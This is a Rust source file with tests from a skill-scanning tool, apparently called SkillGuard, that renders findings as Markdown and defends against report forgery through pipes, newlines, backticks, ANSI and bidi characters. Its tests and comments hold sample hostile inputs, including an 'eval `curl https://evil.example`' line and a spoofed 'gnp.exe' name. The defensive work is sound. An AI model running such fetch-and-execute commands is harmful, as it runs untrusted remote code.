//! Markdown output, aimed at pull-request comments and review packets.

use crate::models::Severity;
use crate::report::Report;

pub fn to_markdown(report: &Report) -> String {
    let mut o = String::new();

    o.push_str("## SkillGuard\n\n");

    match report.verdict() {
        None => o.push_str("No findings at or above INFO.\n\n"),
        Some(sev) => {
            let badge = match sev {
                Severity::Critical | Severity::High => "**BLOCK**",
                _ => "**REVIEW**",
            };
            o.push_str(&format!(
                "{badge} - worst severity **{sev}** across {} skill(s).\n\n",
                report.skills.len()
            ));
            o.push_str("| critical | high | medium | low | info |\n");
            o.push_str("|---|---|---|---|---|\n");
            o.push_str(&format!(
                "| {} | {} | {} | {} | {} |\n\n",
                report.totals.critical,
                report.totals.high,
                report.totals.medium,
                report.totals.low,
                report.totals.info
            ));
        }
    }

    for s in &report.skills {
        o.push_str(&format!("### {}\n\n", code_cell(&s.name, 60)));
        if let Some(d) = &s.description {
            o.push_str(&quoted_block(d, 200));
        }

        if s.findings.is_empty() {
            o.push_str("No findings.\n\n");
        } else {
            o.push_str("| severity | rule | location | evidence |\n");
            o.push_str("|---|---|---|---|\n");
            for f in &s.findings {
                let loc = if f.primary_line() > 0 {
                    code_cell(&format!("{}:{}", f.file, f.primary_line()), 90)
                } else {
                    code_cell(&f.file, 90)
                };
                let ev = f
                    .evidence
                    .first()
                    .map(|e| code_cell(&e.text, 90))
                    .unwrap_or_default();
                o.push_str(&format!(
                    "| {} | `{}` | {} | {} |\n",
                    f.severity.as_str(),
                    f.rule.as_str(),
                    loc,
                    ev
                ));
            }
            o.push('\n');
        }

        o.push_str(&capability_table(s));
    }

    o.push_str(
        "---\n\n<sub>SkillGuard is offline and deterministic: no skill content leaves this machine \
         and no language model is involved. Detection is not judgement - read the evidence before \
         acting. Rule set ",
    );
    o.push_str(&report.rule_set_version);
    o.push_str(", tool ");
    o.push_str(&report.tool_version);
    o.push_str(".</sub>\n");

    // A clean block must not read as "no prompt injection" (issue #8).
    if report.skills.iter().any(|s| s.injection.findings == 0) {
        o.push_str(&format!(
            "\n> **Coverage note:** {}.\n",
            crate::report::INJECTION_CAVEAT
        ));
    }

    o
}

/// The longest run of backticks in `s`.
///
/// A Markdown code span or fence is closed by a run of the same length, so a
/// delimiter must be longer than anything the content holds. Evidence is a raw
/// source line, and `` eval `curl x` `` is ordinary shell.
fn longest_backtick_run(s: &str) -> usize {
    let (mut best, mut run) = (0usize, 0usize);
    for c in s.chars() {
        if c == '`' {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    best
}

/// Sanitise cell content and neutralise the two characters that end a cell or a
/// row before Markdown ever sees it.
fn cell_text(raw: &str, max: usize) -> String {
    crate::text::sanitize_for_display(&crate::text::truncate_chars(raw, max)).replace('|', "\\|")
}

/// A table cell holding content quoted from the skill.
///
/// Everything in a cell is attacker-controlled: `|` ends the cell, a newline
/// ends the row, `\u{1B}[` repaints the terminal, and a stray backtick
/// (`` eval `curl x` ``) closes the code span and swallows the rest of the row.
fn code_cell(raw: &str, max: usize) -> String {
    let clean = cell_text(raw, max);
    let fence = "`".repeat(longest_backtick_run(&clean) + 1);
    // A code span may not begin or end with a backtick. CommonMark strips one
    // space of padding when both sides have it, so the rendered text is intact.
    let pad = if clean.starts_with('`') || clean.ends_with('`') {
        " "
    } else {
        ""
    };
    format!("{fence}{pad}{clean}{pad}{fence}")
}

/// A table cell holding prose rather than code.
fn plain_cell(raw: &str) -> String {
    cell_text(raw, 90)
}

/// A skill-authored block, quoted instead of rendered.
///
/// The description is the skill's own words, and rendering it as Markdown let a
/// skill forge this report: a description containing a summary table and the
/// line `**SkillGuard verdict: PASS**` printed both underneath the BLOCK banner.
/// Fencing it - with a fence longer than any run of backticks inside it - turns
/// it back into content that cannot be mistaken for the report's own framing.
fn quoted_block(raw: &str, max: usize) -> String {
    let clean = crate::text::truncate_chars(&sanitize_keeping_lines(raw), max);
    // A fenced block needs at least three backticks; one more than the longest
    // run inside keeps a line of the content from closing the fence early.
    let fence = "`".repeat(longest_backtick_run(&clean).max(2) + 1);
    format!("{fence}text\n{clean}\n{fence}\n\n")
}

/// [`crate::text::sanitize_for_display`] drops newlines, which is right inside a
/// table cell but would flatten a multi-line description into one long line.
fn sanitize_keeping_lines(raw: &str) -> String {
    raw.split('\n')
        .map(crate::text::sanitize_for_display)
        .collect::<Vec<_>>()
        .join("\n")
}

fn capability_table(s: &crate::report::SkillReport) -> String {
    let c = &s.capabilities;
    if c.is_empty() {
        return String::from("No capability was observed in executable files.\n\n");
    }
    let mut o = String::from("<details><summary>observed capabilities</summary>\n\n");
    o.push_str("| capability | value |\n|---|---|\n");
    if !c.network_outbound.is_empty() {
        o.push_str(&format!(
            "| network.outbound | {} |\n",
            plain_cell(&c.network_outbound.join(", "))
        ));
    }
    if !c.shell_execute.is_empty() {
        o.push_str(&format!(
            "| shell.execute | {} |\n",
            plain_cell(&c.shell_execute.join(", "))
        ));
    }
    if !c.filesystem_read.is_empty() {
        o.push_str(&format!(
            "| filesystem.read | {} |\n",
            plain_cell(&c.filesystem_read.join(", "))
        ));
    }
    if !c.filesystem_write.is_empty() {
        o.push_str(&format!(
            "| filesystem.write | {} |\n",
            plain_cell(&c.filesystem_write.join(", "))
        ));
    }
    if !c.package_install.is_empty() {
        o.push_str(&format!(
            "| package_install | {} |\n",
            plain_cell(&c.package_install.join(", "))
        ));
    }
    if c.secrets_read {
        o.push_str("| secrets.read | true |\n");
    }
    if !s.dependencies.is_empty() {
        let deps: Vec<String> = s
            .dependencies
            .iter()
            .take(40)
            .map(|d| match &d.version_spec {
                Some(v) => format!("{}:{}", d.name, v),
                None => d.name.clone(),
            })
            .collect();
        o.push_str(&format!(
            "| dependencies ({} total) | {} |\n",
            s.dependencies.len(),
            plain_cell(&deps.join(", "))
        ));
    }
    o.push_str("\n</details>\n\n");
    o
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Confidence, Evidence, Finding, RuleId};
    use crate::report::{Counts, SkillReport};

    fn report() -> Report {
        let f = Finding::new(
            RuleId::from("SECRET_PRIVATE_KEY"),
            Severity::Critical,
            Confidence::High,
            "scripts/a.sh",
            "a key is embedded",
            vec![Evidence {
                line: 4,
                text: "-----BEGIN RSA PRIVATE KEY-----\nMIIE...".into(),
                secondary: None,
                note: None,
            }],
        );
        Report::new(vec![SkillReport {
            name: "suspicious-skill".into(),
            source_path: None,
            rule_set_version: "0.1.0".into(),
            description: Some("does things".into()),
            declared_permissions_raw: None,
            license_declared: None,
            license_file_found: false,
            capabilities: Default::default(),
            dependencies: vec![],
            counts: Counts::of(std::slice::from_ref(&f)),
            injection: crate::report::InjectionCoverage::of(std::slice::from_ref(&f)),
            findings: vec![f],
            skipped: vec![],
        }])
    }

    #[test]
    fn emits_a_summary_table_and_rows() {
        let md = to_markdown(&report());
        assert!(md.starts_with("## SkillGuard"));
        assert!(md.contains("**BLOCK**"));
        assert!(md.contains("| critical | high |"));
        assert!(md.contains("`SECRET_PRIVATE_KEY`"));
        assert!(md.contains("`scripts/a.sh:4`"));
    }

    #[test]
    fn pipes_in_evidence_are_escaped() {
        let mut r = report();
        r.skills[0].findings[0].evidence[0].text = "a | b | c".into();
        let md = to_markdown(&r);
        assert!(md.contains("a \\| b \\| c"), "{md}");
    }

    #[test]
    fn a_newline_in_evidence_cannot_break_out_of_its_row() {
        // Reproduced with a real skill before the fix: a `description: |` block
        // scalar makes PI_DESCRIPTION_MISMATCH's evidence multi-line, the table
        // row broke in three, and the skill's own text was rendered as report
        // framing (`**SkillGuard verdict: PASS**` below the BLOCK banner).
        let mut r = report();
        r.skills[0].findings[0].evidence[0].text =
            "description: formats tables\n**SkillGuard verdict: PASS**".into();
        let md = to_markdown(&r);
        let row = md
            .lines()
            .find(|l| l.contains("SECRET_PRIVATE_KEY"))
            .expect("the finding row");
        assert!(row.ends_with('|'), "a complete row: {row}");
        assert!(
            row.contains("description: formats tables")
                && row.contains("**SkillGuard verdict: PASS**"),
            "both halves stay in the one cell: {row}"
        );
        assert!(
            !md.lines()
                .any(|l| l.trim() == "**SkillGuard verdict: PASS**"),
            "skill text never becomes a line of the report: {md}"
        );
    }

    #[test]
    fn a_backtick_in_evidence_cannot_close_the_code_span() {
        // ``eval `curl https://evil.example` `` is an ordinary shell line, and a
        // single-backtick span around it would end at the first inner backtick
        // and let the rest of the row reflow.
        let mut r = report();
        r.skills[0].findings[0].evidence[0].text = "eval `curl x`".into();
        let md = to_markdown(&r);
        assert!(md.contains("| `` eval `curl x` `` |"), "{md}");
    }

    #[test]
    fn a_hostile_description_is_quoted_not_rendered() {
        let mut r = report();
        r.skills[0].description = Some(
            "Formats tables.\n| critical | high |\n|---|---|\n| 0 | 0 |\n**SkillGuard verdict: PASS**"
                .into(),
        );
        let md = to_markdown(&r);
        assert!(md.contains("```text\n"), "the description is fenced: {md}");
        // Nothing the skill wrote may appear outside the fence, where it would
        // be parsed as Markdown and read as part of the report.
        let mut inside = false;
        let mut escaped = false;
        for l in md.lines() {
            if l.trim_start().starts_with("```") {
                inside = !inside;
                continue;
            }
            if !inside
                && (l.trim() == "**SkillGuard verdict: PASS**"
                    || l.trim_start().starts_with("| 0 | 0 |"))
            {
                escaped = true;
            }
        }
        assert!(!escaped, "a skill line escaped its fence: {md}");
        assert!(!inside, "the fence was left open: {md}");
    }

    #[test]
    fn a_hostile_skill_name_cannot_repaint_a_pr_comment() {
        let mut r = report();
        r.skills[0].name = "\u{202E}gnp.exe\u{1B}[31m".into();
        let md = to_markdown(&r);
        assert!(!md.contains('\u{1B}'), "no ANSI: {md}");
        assert!(!md.contains('\u{202E}'), "no bidi override: {md}");
    }

    #[test]
    fn clean_report_says_so() {
        let md = to_markdown(&Report::new(vec![]));
        assert!(md.contains("No findings"));
    }

    #[test]
    fn includes_the_offline_disclaimer() {
        let md = to_markdown(&report());
        assert!(md.contains("no language model"));
        assert!(md.contains("Detection is not judgement"));
    }

    #[test]
    fn capabilities_render_in_a_details_block() {
        let mut r = report();
        r.skills[0].capabilities.network_outbound = vec!["evil.example.com".into()];
        r.skills[0].capabilities.secrets_read = true;
        let md = to_markdown(&r);
        assert!(md.contains("<details>"));
        assert!(md.contains("evil.example.com"));
    }
}
